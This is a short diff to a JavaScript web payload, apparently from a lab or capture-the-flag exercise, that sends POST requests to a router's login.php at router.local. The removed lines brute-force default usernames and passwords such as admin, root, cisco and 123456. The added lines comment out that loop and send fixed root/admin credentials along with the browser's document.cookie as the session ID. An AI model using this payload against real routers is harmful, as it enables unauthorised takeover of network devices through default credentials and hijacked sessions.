@@ -1,7 +1,7 @@
-const pwd = ["secured", "password", "123456", "admin"];
-const username = ["admin","cisco","root"];
-for (p in pwd) {
-    for (u in username) {
+// const pwd = ["secured", "password", "123456", "admin"];
+// const username = ["admin","cisco","root"];
+// for (p in pwd) {
+//     for (u in username) {
         const http = new XMLHttpRequest();
         http.open('POST', 'http://router.local/login.php', true);
         http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
@@ -18,8 +18,8 @@ for (p in pwd) {
         const cook = document.cookie;
 
 
-        http.send("PHPSESSID="+cook+"&username="+u+"&pin="+p+"&notRobot=on");
-    }
-}
+        http.send("PHPSESSID="+cook+"&username=root&pin=admin&notRobot=on");
+//     }
+// }
    
 
